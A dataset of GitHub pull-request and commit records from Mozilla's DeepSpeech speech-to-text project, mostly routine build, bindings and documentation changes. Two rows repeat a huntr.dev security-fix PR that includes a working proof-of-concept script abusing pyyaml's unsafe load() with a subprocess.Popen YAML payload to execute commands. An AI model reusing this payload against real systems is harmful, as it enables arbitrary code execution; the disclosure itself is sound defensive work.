69,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2dd757ac0ae801f4b7cfe41e775b4807ce6a8715,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
70,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cd7aa33f71e9bf2714fe6e1ca8c3f26249a4b153,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
71,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0277ea626e430b469f74768577a9f0123edaf40,Trying to produce nuget package with all archs
72,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,feab9d245b4603301f578d8f9f4184a8eab23f76,fix for directory in tyml
73,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5242a14b77955a6c2d0ebb6446d5aba4bcbbc5d0,more dotnetpackage template fixes
74,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9565b22c5b7eaf6826f700935800d3c7d1ee8938,more dotnet tfile fix
75,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84ffec6acc545c8481dabc4ddaf904d84344a637,another dotnet tyml try
76,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1acba3114f615a47c6487aa8359bdd9a96ca3f29,dotnet tyml fix
77,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6c411fb227a946ea25923371cc2b59813f1c713,dotnet tyml as in node
78,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3528,3528,Fix incompatible Swift,,lissyx,1645737,2021-02-12T08:10:56Z,COLLABORATOR,True,4,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d83e181137ac87710cf827512028de2f9c964e7,Fix incompatible Swift
79,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3527,3527,Fix incompatible Swift module error,"Fixes `module compiled with Swift 5.1.3 cannot be imported by the Swift 5.3.2`. 

Tested by following [these](https://github.com/mozilla/DeepSpeech/pull/3436) instructions.",zaptrem,1612230,2021-02-12T06:05:50Z,CONTRIBUTOR,True,4,9,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d83e181137ac87710cf827512028de2f9c964e7,Fix incompatible Swift
80,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3526,3526,Hotwords comments,,Ideefixze,44556744,2021-02-11T13:58:33Z,CONTRIBUTOR,False,81,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f774d8b2feb52e546c523482b5acdd9d7f0a1f92,"Added hot-word boosting api example doc
X-DeepSpeech: NOBUILD"
81,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3526,3526,Hotwords comments,,Ideefixze,44556744,2021-02-11T13:58:33Z,CONTRIBUTOR,False,81,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1dfc1dc532097bec8ece06809696be91e2bf53c6,"Rewrote a sentence
X-DeepSpeech: NOBUILD"
82,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3526,3526,Hotwords comments,,Ideefixze,44556744,2021-02-11T13:58:33Z,CONTRIBUTOR,False,81,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1385f8e8390a8891224d1fddf29a4c9cddb3de7f,"Line fix
X-DeepSpeech: NOBUILD"
83,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3526,3526,Hotwords comments,,Ideefixze,44556744,2021-02-11T13:58:33Z,CONTRIBUTOR,False,81,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9695495143228d8496c579c0da9340854773eae3,Restructured text and corrections for more specific language
84,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3526,3526,Hotwords comments,,Ideefixze,44556744,2021-02-11T13:58:33Z,CONTRIBUTOR,False,81,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e874d4520a749e996787f18c2f27cca22611240c,"C#,Java,JS,Python,C hot-words API comments"
85,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3526,3526,Hotwords comments,,Ideefixze,44556744,2021-02-11T13:58:33Z,CONTRIBUTOR,False,81,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,59cc83341df863fd2c34cab8b9d3a8d518f7fe6d,Put line to param desc
86,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3524,3524,Added hot-word boosting doc,"Based on my post on Discourse Mozilla forum: 
https://discourse.mozilla.org/t/practical-tests-of-hot-word-feature-and-default-models-accuracy/73855

I've added an example & guideline docs for hot-word boosting since those are missing. Also, not sure if the category for this document is correct.",Ideefixze,44556744,2021-02-10T16:52:51Z,CONTRIBUTOR,True,76,8,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cf257a2f52a698f6f3150e2c4c760b5268c80f6,"Added hot-word boosting api example doc
Comments for API bindings
X-DeepSpeech: NOBUILD"
87,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3518,3518,Fix #3517: Update SWIG sha1,,lissyx,1645737,2021-02-01T15:22:26Z,COLLABORATOR,True,10,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6eca9b4e0abbfc1c4c9e83266cc196c7158f6c7e,Fix #3517: Update SWIG sha1
88,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3514,3514,Set base image to ubuntu 18.04,,lissyx,1645737,2021-01-25T09:42:14Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,54565a056f7b0f6aea58bf097af95e2ee881357e,Set base image to ubuntu 18.04
89,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3513,3513,Fix decision task,,lissyx,1645737,2021-01-25T09:42:07Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9dde5726cd8982fe831e80ad8aa07140372403bf,Fix decision task
90,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3512,3512,Convert Audio on the Fly,"This uses the `AudioFile` wrapper during sample to get conversion to the correct sample rate, channels, and width on the fly if necessary. It's still more efficient to perform this before training, but this makes it more convenient when adding data with e.g. a different sample rate on the fly.

Let me know what you think about this. Of course, if the rest of the training code could handle differing sample rates etc. on the fly, that would alleviate the need for this. Saw some TODOs on that front in the code, but figured it wasn't done.

Irrespective of the other two commits, I think https://github.com/mozilla/DeepSpeech/commit/e4bb082f8051d02be386d31b890e618acf5729b6 should get applied as that is just a bug fix for something that I broke earlier while implementing the remote training I/O stuff. I was surprised to see that `AudioFile` was actually not really being used anywhere except when splitting audio files for dataset prep, so was wondering why.",CatalinVoss,332459,2021-01-22T22:44:57Z,COLLABORATOR,False,14,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4bb082f8051d02be386d31b890e618acf5729b6,Move `AudioFile` fixes into a clean branch
91,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3512,3512,Convert Audio on the Fly,"This uses the `AudioFile` wrapper during sample to get conversion to the correct sample rate, channels, and width on the fly if necessary. It's still more efficient to perform this before training, but this makes it more convenient when adding data with e.g. a different sample rate on the fly.

Let me know what you think about this. Of course, if the rest of the training code could handle differing sample rates etc. on the fly, that would alleviate the need for this. Saw some TODOs on that front in the code, but figured it wasn't done.

Irrespective of the other two commits, I think https://github.com/mozilla/DeepSpeech/commit/e4bb082f8051d02be386d31b890e618acf5729b6 should get applied as that is just a bug fix for something that I broke earlier while implementing the remote training I/O stuff. I was surprised to see that `AudioFile` was actually not really being used anywhere except when splitting audio files for dataset prep, so was wondering why.",CatalinVoss,332459,2021-01-22T22:44:57Z,COLLABORATOR,False,14,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79ef7e89e0a6e509b7c1593e9f04dd12785de627,Add conversion alerts back in
92,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3512,3512,Convert Audio on the Fly,"This uses the `AudioFile` wrapper during sample to get conversion to the correct sample rate, channels, and width on the fly if necessary. It's still more efficient to perform this before training, but this makes it more convenient when adding data with e.g. a different sample rate on the fly.

Let me know what you think about this. Of course, if the rest of the training code could handle differing sample rates etc. on the fly, that would alleviate the need for this. Saw some TODOs on that front in the code, but figured it wasn't done.

Irrespective of the other two commits, I think https://github.com/mozilla/DeepSpeech/commit/e4bb082f8051d02be386d31b890e618acf5729b6 should get applied as that is just a bug fix for something that I broke earlier while implementing the remote training I/O stuff. I was surprised to see that `AudioFile` was actually not really being used anywhere except when splitting audio files for dataset prep, so was wondering why.",CatalinVoss,332459,2021-01-22T22:44:57Z,COLLABORATOR,False,14,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,923ff0361875d23accfdc7d52450c386faca7088,Enable on-the-fly conversion during sample unpacking
93,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3510,3510,Swift iOS Bindings: Expose DeepSpeechTokenMetadata fields,"Currently, attempting to access member fields DeepSpeechTokenMetadata objects output from intermediateDecodeWithMetadata causes a crash. Changing these lines makes the object work as (I assume) intended.",zaptrem,1612230,2021-01-22T08:43:27Z,CONTRIBUTOR,True,5,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,28ddc6b0e00d3bf698ae105dd8b51318e09f234a,"Expose DeepSpeechTokenMetadata fields

Currently, attempting to access member fields DeepSpeechTokenMetadata objects output from intermediateDecodeWithMetadata causes a crash. Changing these lines makes the object work as (I assume) intended."
94,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3509,3509,Security Fix for Arbitrary Code Execution - huntr.dev,"https://huntr.dev/users/Anon-Artist has fixed the Arbitrary Code Execution vulnerability 🔨. Think you could fix a vulnerability like this?

Get involved at https://huntr.dev/

Q | A
Version Affected | ALL
Bug Fix | YES
Original Pull Request | https://github.com/418sec/DeepSpeech/pull/1
Vulnerability README | https://github.com/418sec/huntr/blob/master/bounties/other/DeepSpeech/1/README.md

### User Comments:

### :bar_chart: Metadata *

Arbitrary Code Excecution in mozilla/DeepSpeech.DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.

#### Bounty URL: https://www.huntr.dev/bounties/1-other-DeepSpeech

### :gear: Description *

This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function load() in pyyaml

### :computer: Technical Description *

Fixed by avoiding unsafe loader.

### :bug: Proof of Concept (PoC) *

Create the following PoC file:
exploit.py

```
import os

env = ['GITHUB_HEAD_BRANCH', 'GITHUB_HEAD_REPO_URL', 'GITHUB_HEAD_SHA', 'GITHUB_HEAD_USER', 'GITHUB_HEAD_USER_LOGIN', 'TASK_ID']

for x in env:
    if ""USER"" in x:
        env = ""mozilla""
    elif ""LOGIN"" in x:
        env = ""mozilla""
    elif ""TASK_ID"" in x:
        env = ""137""
    else:
        env = """"
    os.environ[x] = env

#os.system(""git clone https://github.com/mozilla/DeepSpeech.git"")
os.chdir(""DeepSpeech/taskcluster"")
os.system(""mkdir temp/"")
os.system(""mv *.yml *.cyml *.tyml temp/"")

exploit_yaml = """"""build:
  metadata:
    name: ""DeepSpeech Android ARM64 debug""
    description: ""Building DeepSpeech for Android ARM64, debug version""

  template_file: extent_exploit.yml
""""""

open(""exploit.yml"", ""w+"").write(exploit_yaml)

# data = b""""""!!python/object/apply:subprocess.Popen
# - ls""""""
extent_yaml = """"""!!python/object/apply:subprocess.Popen
- ['xcalc']
""""""

# extent_yaml = """"""!!python/object/apply:time.sleep [10]""""""

open(""extent_exploit.yml"", ""w+"").write(extent_yaml)

# os.system(""python -m pip install json-e"")
# os.system(""python -m pip install slugid"")
# os.system(""python -m pip install networkx"")

os.system(""python tc-decision.py --dry"")
```

Execute the following commands in another terminal:

```
python3 exploit.py
```

    Check the Output:

xcalc will pop up.

### :fire: Proof of Fix (PoF) *

After fix it will not popup a calc

### :+1: User Acceptance Testing (UAT)

After fix functionality is unaffected.
",huntr-helper,61279246,2021-01-22T08:30:30Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5edfcdb92e59792747edd536bdc5356e7cb0846b,Update tc-decision.py
95,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3509,3509,Security Fix for Arbitrary Code Execution - huntr.dev,"https://huntr.dev/users/Anon-Artist has fixed the Arbitrary Code Execution vulnerability 🔨. Think you could fix a vulnerability like this?

Get involved at https://huntr.dev/

Q | A
Version Affected | ALL
Bug Fix | YES
Original Pull Request | https://github.com/418sec/DeepSpeech/pull/1
Vulnerability README | https://github.com/418sec/huntr/blob/master/bounties/other/DeepSpeech/1/README.md

### User Comments:

### :bar_chart: Metadata *

Arbitrary Code Excecution in mozilla/DeepSpeech.DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.

#### Bounty URL: https://www.huntr.dev/bounties/1-other-DeepSpeech

### :gear: Description *

This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function load() in pyyaml

### :computer: Technical Description *

Fixed by avoiding unsafe loader.

### :bug: Proof of Concept (PoC) *

Create the following PoC file:
exploit.py

```
import os

env = ['GITHUB_HEAD_BRANCH', 'GITHUB_HEAD_REPO_URL', 'GITHUB_HEAD_SHA', 'GITHUB_HEAD_USER', 'GITHUB_HEAD_USER_LOGIN', 'TASK_ID']

for x in env:
    if ""USER"" in x:
        env = ""mozilla""
    elif ""LOGIN"" in x:
        env = ""mozilla""
    elif ""TASK_ID"" in x:
        env = ""137""
    else:
        env = """"
    os.environ[x] = env

#os.system(""git clone https://github.com/mozilla/DeepSpeech.git"")
os.chdir(""DeepSpeech/taskcluster"")
os.system(""mkdir temp/"")
os.system(""mv *.yml *.cyml *.tyml temp/"")

exploit_yaml = """"""build:
  metadata:
    name: ""DeepSpeech Android ARM64 debug""
    description: ""Building DeepSpeech for Android ARM64, debug version""

  template_file: extent_exploit.yml
""""""

open(""exploit.yml"", ""w+"").write(exploit_yaml)

# data = b""""""!!python/object/apply:subprocess.Popen
# - ls""""""
extent_yaml = """"""!!python/object/apply:subprocess.Popen
- ['xcalc']
""""""

# extent_yaml = """"""!!python/object/apply:time.sleep [10]""""""

open(""extent_exploit.yml"", ""w+"").write(extent_yaml)

# os.system(""python -m pip install json-e"")
# os.system(""python -m pip install slugid"")
# os.system(""python -m pip install networkx"")

os.system(""python tc-decision.py --dry"")
```

Execute the following commands in another terminal:

```
python3 exploit.py
```

    Check the Output:

xcalc will pop up.

### :fire: Proof of Fix (PoF) *

After fix it will not popup a calc

### :+1: User Acceptance Testing (UAT)

After fix functionality is unaffected.
",huntr-helper,61279246,2021-01-22T08:30:30Z,NONE,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fcfe5f0e0ab139aa1bb9b61a0111447cf499a638,"Merge pull request #1 from Anon-Artist/RCE-fix

RCE-Fixed"
96,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3508,3508,Docu building ctc decoder on unsupported architecture,As mentioned in  #3505 and #3379 I documented how to build ctc decoder on ppc64le,NanoNabla,43477372,2021-01-21T20:03:44Z,CONTRIBUTOR,True,32,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aec81bc0488bbbeaa4fea532a38c9315db22503b,add hints for building ctcdecode on unsupported platforms
97,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3508,3508,Docu building ctc decoder on unsupported architecture,As mentioned in  #3505 and #3379 I documented how to build ctc decoder on ppc64le,NanoNabla,43477372,2021-01-21T20:03:44Z,CONTRIBUTOR,True,32,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,334f6b1e476c84ceb06ab155be7a70a5dc7077d8,improve ctcdecode docu for unsupported platforms
98,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3508,3508,Docu building ctc decoder on unsupported architecture,As mentioned in  #3505 and #3379 I documented how to build ctc decoder on ppc64le,NanoNabla,43477372,2021-01-21T20:03:44Z,CONTRIBUTOR,True,32,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5873145c8e836fcd9d2cf0db6bea496e0ea18a9e,arm is not supported for building cdcdecoder
99,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3506,3506,Pr 3505,,lissyx,1645737,2021-01-20T19:57:11Z,COLLABORATOR,False,5,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,80da74c4723d643ac7485d325470fae0c526e03d,add build rules for ctcdecode on ppc64le
100,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3506,3506,Pr 3505,,lissyx,1645737,2021-01-20T19:57:11Z,COLLABORATOR,False,5,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0f0a2d6e899df27fd454f83ec633f8e4ae59d7a,"applying lissyx's patch from mozilla#3379, make it possible to set `PYTHON_PLATFORM_NAME` in environment on target `host`"
101,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3505,3505,build ctcdecode on ppc64le,"Solves #3379
- Makes building ctcdecode on PowerPC `ppc64le` and other non x86/arm systems with linux possible
- set `PYTHON_PLATFORM_NAME` and `SWIG_DIST_URL` in environment
- For `ppc64le` set `PYTHON_PLATFORM_NAME=""--plat-name linux_ppc64le""`.  This should be mentioned somehow in docu
- It should also be mentioned to use https://github.com/lissyx/swig/tree/taskcluster instead of plain swig",NanoNabla,43477372,2021-01-20T19:38:26Z,CONTRIBUTOR,True,5,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,80da74c4723d643ac7485d325470fae0c526e03d,add build rules for ctcdecode on ppc64le
102,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3505,3505,build ctcdecode on ppc64le,"Solves #3379
- Makes building ctcdecode on PowerPC `ppc64le` and other non x86/arm systems with linux possible
- set `PYTHON_PLATFORM_NAME` and `SWIG_DIST_URL` in environment
- For `ppc64le` set `PYTHON_PLATFORM_NAME=""--plat-name linux_ppc64le""`.  This should be mentioned somehow in docu
- It should also be mentioned to use https://github.com/lissyx/swig/tree/taskcluster instead of plain swig",NanoNabla,43477372,2021-01-20T19:38:26Z,CONTRIBUTOR,True,5,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0f0a2d6e899df27fd454f83ec633f8e4ae59d7a,"applying lissyx's patch from mozilla#3379, make it possible to set `PYTHON_PLATFORM_NAME` in environment on target `host`"
103,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3504,3504,WIP: Introduce libdeepspeech_android / libdeepspeech_jre,,lissyx,1645737,2021-01-20T14:40:25Z,COLLABORATOR,False,3,3,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23a742a7e065a583c4c1dbcd1fd997696407ac84,WIP: Introduce libdeepspeech_android / libdeepspeech_jre
104,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d515f56861909830ea9d3afcb1eeebf437b6f80,"Added standalone java bindings, including usage documentation and a setup script"
105,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,662de5950977e727448b90094087f173dfa814a4,Merged 'java_standalone' into 'java'. Tried to make it as neat as possible having 'vanilla' Java and the Android bits side by side
106,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d8f9ee2f8b6dd516c5c6db4751653fad612fcaf,"Housekeeping
- Fixed up Android's Makefile, this got overriden by CMake for the standalone version
- Seperate build.gradle and CMakeList.txt for Android and standalone
- Changed DeepSpeechModel.java to give control of library loading back to the user
- Updated README.md to reflect changes to DeepSpeechModel.java"
107,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,86a3c52297458e75cb8574222376b70225184c4c,Updated README.md with correct relative paths and added a short section for building for Android
108,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a15aed62d7e79d4c6545ee933ac2f2ffa05095de,"Housekeeping
- Split out README.md into standalone.md, for all the bits that are standalone-specific
- Removed all automatically generated java files (generated by SWIG)
- Updated .gitignore to reflect the change above
- Updated DeepSpeechModel.java to be API-compatible with how it was, whilst also allowing the standalone to function (allowing you to load the libraries yourself, if wanted)"
109,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07ba928256b907cb36cc834f9f581b0389356b95,"Conversion to Makefile
- Replaced setup.sh with target `standalone` in Makefile
- Updated documentation accordingly
- Updated CMakeLists_standalone to work with it now being used from Make (some path things for libdeepspeech.so)
- Fixed some wrongly formatted javadoc in DeepSpeechModel.java"
110,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff12a73d30db1e18e359e19cf4526e1941a43fdb,Intermediate commit
111,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3503,3503,Standalone Java bindings,"Solves #3502

- Added standalone Java bindings, that do not rely on Android
- Script to produce and collect all required files for usage in the end users own projects
- Instructions on how to use and example on how to use",TheDutchMC,28569170,2021-01-18T17:01:17Z,COLLABORATOR,False,796,146,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6bbc27ab27913e4821bc9c6dd9457cbb7fa31f6b,"Housekeeping
- Split out libdeepspeech into _android and _jre, for the respective versions
- Moved settings.gradle to both versions, and modified them appropriately
- Removed .so files, which were accidentally included in the previous commit, same goes for Makefile.original
- Updated .gitignore's to work with the new structure
- libdeepspeech_android is exactly as it is currently in mozilla:master
- Updated Makefile to work with the new structure"
112,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3497,3497,Added a progressbar for multiplefile,"I have added a progress bar for multifile, each file completion will result in the proportional change in the progress. I have use tqdm package and added the same in setup.py.",vipinkatara,30955404,2021-01-12T18:33:11Z,NONE,False,3,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,206febdba46a95a4c2bc013aefffe5165fb91104,Added a progressbar for multiplefile
113,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3493,3493,Add ogg opus training support,,reuben,477142,2021-01-10T14:18:25Z,MEMBER,True,277,126,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d4152f6e67b7f3310ce9f39a92450396ad0c7b86,Add support for Ogg/Opus audio files for training
114,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3493,3493,Add ogg opus training support,,reuben,477142,2021-01-10T14:18:25Z,MEMBER,True,277,126,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c0d46cb7ff38e5a7c16d312cdbf1f8f491f0ea1,Normalize sample rate of train_files by default
115,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3493,3493,Add ogg opus training support,,reuben,477142,2021-01-10T14:18:25Z,MEMBER,True,277,126,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79a42b345d8b3b1356d94a30389d255651ce56d6,Read audio format from data before running augmentation passes instead of assuming default
